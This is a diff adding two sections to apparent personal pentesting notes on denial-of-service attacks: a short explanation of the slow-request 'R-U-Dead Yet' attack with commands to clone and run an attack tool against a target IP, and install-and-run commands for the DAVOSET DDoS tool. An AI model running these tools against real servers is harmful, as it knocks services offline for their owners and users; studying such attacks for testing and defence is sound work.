@@ -201,6 +201,30 @@ This can be done with any ForLoop() using native BASH, DOS or Powershell
 ### UDP Flood
 ![[Pasted image 20250309231632.png]]
 
+### R-U-Dead Yet
+
+This is a form of slow and slow attack used to send small requests to the server, so the server can keep the connections open. This in a way simulate a connection from a user who has a slow network and can sometimes fool the server
+```bash
+git clone https://github.com/shahilchaddha/rudyjs
+#usage to send get requests
+rudy - http://IP -n 1000 -d 5 -m "GET"
+```
+
+![[Pasted image 20250906152357.png]]
+
+
+### DEVOS
+
+```bash
+#Install
+curl -L https://cpanmin.us | perl - --sudo App::cpanminus
+git clone https://github.com/MustLive/DAVOSET.git
+
+#Running it
+sudo cpanm IO::Socket::Socks
+perl davoset.pl
+```
+
 ### Home Users
 A lot of home users have their **router**  vulnerable to **UDP Ping of Doom**
 We can check if our router is vulnerable by pinging our **External IP** from outside our network or alternatively
